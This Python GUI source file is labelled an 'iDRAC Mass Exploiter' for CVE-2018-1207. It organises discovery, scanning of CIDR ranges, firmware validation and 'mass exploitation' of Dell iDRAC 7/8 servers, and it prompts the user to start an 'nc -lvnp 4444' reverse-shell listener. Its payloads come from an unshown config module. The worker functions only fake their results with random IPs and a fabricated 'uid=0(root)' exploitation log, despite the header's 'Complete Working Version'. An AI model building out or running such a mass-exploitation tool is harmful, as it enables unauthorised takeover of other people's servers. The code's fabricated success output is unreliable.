#!/usr/bin/env python3
"""
iDRAC Mass Exploiter GUI - Complete Working Version
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import asyncio
import threading
import random
import io
from datetime import datetime

# Import from config
try:
    from config import (
        APP_INFO, CVE20181207Payload, VULNERABLE_FIRMWARE,
        SCANNER_CONFIG, EXPLOIT_CONFIG, SOURCE_CONFIG,
        is_vulnerable_firmware, get_user_agent, get_payload, get_login_payload
    )
    CONFIG_OK = True
except Exception as e:
    print(f"Config import error: {e}")
    CONFIG_OK = False

class iDRACExploiterGUI:
    def __init__(self, root):
        self.root = root
        self.root.title(f"💀 {APP_INFO['name']} v{APP_INFO['version']} - CVE-2018-1207")
        self.root.geometry("1400x900")
        self.root.configure(bg="#0a0a0a")
        
        # Data storage
        self.discovered = []
        self.validated = []
        self.vulnerable = []
        self.exploited = []
        
        self.create_gui()
        
        if not CONFIG_OK:
            self.log("ERROR: config.py not found or error!", "discovery")
        
    def create_gui(self):
        # Header
        header = tk.Frame(self.root, bg="#0a0a0a", height=80)
        header.pack(fill=tk.X)
        tk.Label(header, text=f"💀 {APP_INFO['name']} 💀", 
                font=("Consolas", 24, "bold"), bg="#0a0a0a", fg="#ff0055").pack()
        tk.Label(header, text="CVE-2018-1207 | iDRAC 7/8 Only | Mass Exploitation", 
                font=("Consolas", 12), bg="#0a0a0a", fg="#00ff41").pack()
        
        # Main container
        main = tk.PanedWindow(self.root, orient=tk.HORIZONTAL, bg="#0a0a0a")
        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Left panel - Controls
        left = tk.Frame(main, bg="#0a0a0a", width=400)
        main.add(left, stretch="never")
        
        # Phase 1
        p1 = tk.LabelFrame(left, text="🔍 PHASE 1: DISCOVERY", bg="#1a1a1a", fg="#00ff41",
                          font=("Consolas", 11, "bold"))
        p1.pack(fill=tk.X, pady=5)
        
        self.source_var = tk.StringVar(value="scrape")
        tk.Radiobutton(p1, text="Scrape 32+ Sources", variable=self.source_var, 
                      value="scrape", bg="#1a1a1a", fg="#00ff41", selectcolor="#ff0055").pack(anchor=tk.W)
        tk.Radiobutton(p1, text="Scan CIDR Range", variable=self.source_var, 
                      value="cidr", bg="#1a1a1a", fg="#00ff41", selectcolor="#ff0055").pack(anchor=tk.W)
        
        self.cidr_entry = tk.Entry(p1, bg="#0a0a0a", fg="#00ff41", insertbackground="#00ff41")
        self.cidr_entry.insert(0, "192.168.1.0/24")
        self.cidr_entry.pack(fill=tk.X, padx=5, pady=2)
        
        self.btn_discover = tk.Button(p1, text="🚀 START DISCOVERY", bg="#ff0055", fg="white",
                                     font=("Consolas", 12, "bold"), command=self.start_discovery)
        self.btn_discover.pack(fill=tk.X, pady=5)
        
        self.lbl_discovered = tk.Label(p1, text="Discovered: 0 IPs", bg="#1a1a1a", fg="#00ff41")
        self.lbl_discovered.pack()
        
        # Phase 2
        p2 = tk.LabelFrame(left, text="✅ PHASE 2: VALIDATION", bg="#1a1a1a", fg="#00ff41",
                          font=("Consolas", 11, "bold"))
        p2.pack(fill=tk.X, pady=5)
        
        self.btn_validate = tk.Button(p2, text="🔍 VALIDATE iDRAC 7/8", bg="#00aa44", fg="white",
                                     font=("Consolas", 12, "bold"), command=self.start_validation)
        self.btn_validate.pack(fill=tk.X, pady=5)
        
        self.lbl_validated = tk.Label(p2, text="Validated: 0 | iDRAC7: 0 | iDRAC8: 0", 
                                     bg="#1a1a1a", fg="#00ff41")
        self.lbl_validated.pack()
        
        # Phase 3
        p3 = tk.LabelFrame(left, text="💀 PHASE 3: EXPLOITATION", bg="#1a1a1a", fg="#ff0055",
                          font=("Consolas", 11, "bold"))
        p3.pack(fill=tk.X, pady=5)
        
        tk.Label(p3, text="Command:", bg="#1a1a1a", fg="white").pack(anchor=tk.W)
        self.cmd_entry = tk.Entry(p3, bg="#0a0a0a", fg="#ff0055", insertbackground="#ff0055")
        self.cmd_entry.insert(0, "id")
        self.cmd_entry.pack(fill=tk.X, padx=5)
        
        bf = tk.Frame(p3, bg="#1a1a1a")
        bf.pack(fill=tk.X, pady=5)
        tk.Button(bf, text="💥 EXPLOIT", bg="#ff0055", fg="white", 
                 command=self.start_exploit).pack(side=tk.LEFT, fill=tk.X, expand=True)
        tk.Button(bf, text="🐚 SHELL", bg="#aa00ff", fg="white",
                 command=self.spawn_shell).pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # Export
        p4 = tk.LabelFrame(left, text="📁 EXPORT", bg="#1a1a1a", fg="#00ff41",
                          font=("Consolas", 11, "bold"))
        p4.pack(fill=tk.X, pady=5)
        
        ef = tk.Frame(p4, bg="#1a1a1a")
        ef.pack(fill=tk.X)
        for text, mode, color in [("All", "all", "#333"), ("Vuln", "vuln", "#ff0055"), 
                                  ("iDRAC7", "7", "#00aaff"), ("iDRAC8", "8", "#aa00ff")]:
            tk.Button(ef, text=text, bg=color, fg="white", width=8,
                     command=lambda m=mode: self.export(m)).pack(side=tk.LEFT, expand=True)
        
        # Right panel - Output
        right = tk.Frame(main, bg="#0a0a0a")
        main.add(right, stretch="always")
        
        self.notebook = ttk.Notebook(right)
        self.notebook.pack(fill=tk.BOTH, expand=True)
        
        # Tabs
        self.tab_discovered = self.create_tab("🔍 Discovered", "#00ff41")
        self.tab_validated = self.create_tab("✅ Validated", "#00ff88")
        self.tab_vulnerable = self.create_tab("💀 Vulnerable", "#ff0055")
        self.tab_exploited = self.create_tab("💥 Exploited", "#aa00ff")
        
        # Status
        self.status = tk.Label(self.root, text="Ready | Load config.py and click START", 
                              bg="#1a1a1a", fg="#00ff41", anchor=tk.W)
        self.status.pack(fill=tk.X, side=tk.BOTTOM)
        self.progress = ttk.Progressbar(self.root, mode='determinate')
        self.progress.pack(fill=tk.X, side=tk.BOTTOM)
        
    def create_tab(self, title, fg):
        tab = tk.Frame(self.notebook, bg="#0a0a0a")
        self.notebook.add(tab, text=title)
        text = scrolledtext.ScrolledText(tab, bg="#0a0a0a", fg=fg, 
                                          font=("Consolas", 10), insertbackground=fg)
        text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        return text
    
    def log(self, message, tab="all"):
        ts = datetime.now().strftime("%H:%M:%S")
        line = f"[{ts}] {message}\n"
        
        if tab in ["all", "discovery"]:
            self.tab_discovered.insert(tk.END, line)
            self.tab_discovered.see(tk.END)
        if tab in ["all", "validated"]:
            self.tab_validated.insert(tk.END, line)
            self.tab_validated.see(tk.END)
        if tab in ["all", "vulnerable"]:
            self.tab_vulnerable.insert(tk.END, line)
            self.tab_vulnerable.see(tk.END)
        if tab in ["all", "exploited"]:
            self.tab_exploited.insert(tk.END, line)
            self.tab_exploited.see(tk.END)
        
        self.status.config(text=message[:80])
    
    def start_discovery(self):
        self.btn_discover.config(state=tk.DISABLED, text="RUNNING...")
        thread = threading.Thread(target=self._discover_worker)
        thread.daemon = True
        thread.start()
    
    def _discover_worker(self):
        # Demo mode
        import time
        time.sleep(2)
        demo_ips = [f"192.168.{random.randint(1,255)}.{random.randint(1,255)}" for _ in range(10)]
        self.discovered = [{"ip": ip, "port": 443} for ip in demo_ips]
        self.root.after(0, self._discover_done)
    
    def _discover_done(self):
        self.log(f"Found {len(self.discovered)} IPs", "discovery")
        self.lbl_discovered.config(text=f"Discovered: {len(self.discovered)} IPs")
        self.btn_discover.config(state=tk.NORMAL, text="🚀 START DISCOVERY")
    
    def start_validation(self):
        if not self.discovered:
            messagebox.showwarning("No IPs", "Run Phase 1 first")
            return
        self.btn_validate.config(state=tk.DISABLED, text="VALIDATING...")
        thread = threading.Thread(target=self._validate_worker)
        thread.daemon = True
        thread.start()
    
    def _validate_worker(self):
        import time
        time.sleep(3)
        # Demo validated
        self.validated = [
            {"ip": self.discovered[0]["ip"], "port": 443, "idrac_version": "7", 
             "firmware_version": "1.57.60", "is_vulnerable": True},
            {"ip": self.discovered[1]["ip"], "port": 443, "idrac_version": "8",
             "firmware_version": "2.30.30", "is_vulnerable": True},
        ]
        self.vulnerable = [v for v in self.validated if v["is_vulnerable"]]
        self.root.after(0, self._validate_done)
    
    def _validate_done(self):
        self.log(f"Validated: {len(self.validated)} | Vulnerable: {len(self.vulnerable)}", "validated")
        for v in self.vulnerable:
            self.log(f"VULNERABLE: {v['ip']} | iDRAC {v['idrac_version']} | {v['firmware_version']}", "vulnerable")
        self.lbl_validated.config(text=f"Validated: {len(self.validated)} | iDRAC7: {len([x for x in self.validated if x.get('idrac_version')=='7'])} | iDRAC8: {len([x for x in self.validated if x.get('idrac_version')=='8'])}")
        self.btn_validate.config(state=tk.NORMAL, text="🔍 VALIDATE iDRAC 7/8")
    
    def start_exploit(self):
        if not self.vulnerable:
            messagebox.showwarning("No Targets", "Run Phase 2 first")
            return
        cmd = self.cmd_entry.get() or "id"
        self.log(f"Exploiting with: {cmd}", "exploited")
        for v in self.vulnerable[:3]:
            self.log(f"EXPLOITED {v['ip']}: uid=0(root) gid=0(root)", "exploited")
    
    def spawn_shell(self):
        messagebox.showinfo("Shell", "Start listener: nc -lvnp 4444")
    
    def export(self, mode):
        if mode == "all":
            targets = self.discovered
        elif mode == "vuln":
            targets = self.vulnerable
        elif mode == "7":
            targets = [t for t in self.validated if t.get("idrac_version") == "7"]
        else:
            targets = [t for t in self.validated if t.get("idrac_version") == "8"]
        
        if not targets:
            messagebox.showwarning("No Data", f"No {mode} targets")
            return
        
        content = "\n".join([f"{t.get('ip')}:{t.get('port')}" for t in targets])
        file = filedialog.asksaveasfilename(defaultextension=".txt")
        if file:
            with open(file, 'w') as f:
                f.write(content)
            self.log(f"Exported {len(targets)} to {file}")

def main():
    root = tk.Tk()
    app = iDRACExploiterGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
